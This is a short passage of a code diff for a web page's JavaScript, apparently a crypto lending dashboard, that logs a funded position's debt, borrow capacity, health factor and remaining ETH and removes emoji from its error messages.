+      log.textContent += 'Debt:        $' + data.position.debt_usd.toLocaleString() + '\n';
+      log.textContent += 'Borrows:     $' + data.position.available_borrows_usd.toLocaleString() + '\n';
+      log.textContent += 'Health:      ' + data.position.health_factor + '\n';
+      log.textContent += 'Remaining:   ' + data.remaining_eth.toFixed(4) + ' ETH\n';
+      log.textContent += '\nPosition funded! Agent triggers now active.';
+      btn.textContent = '[ FUNDED ]';
       btn.style.borderColor = 'var(--green)';
       loadStatus();
     } else {
-      log.textContent += '❌ Error: ' + (data.error || 'Unknown error') + '\n';
+      log.textContent += 'Error: ' + (data.error || 'Unknown error') + '\n';
       btn.textContent = '[ RETRY ]';
     }
   } catch(e) {
-    log.textContent += '❌ Request failed: ' + e.message + '\n';
+    log.textContent += 'Request failed: ' + e.message + '\n';
     btn.textContent = '[ RETRY ]';
   }
   btn.disabled = false;
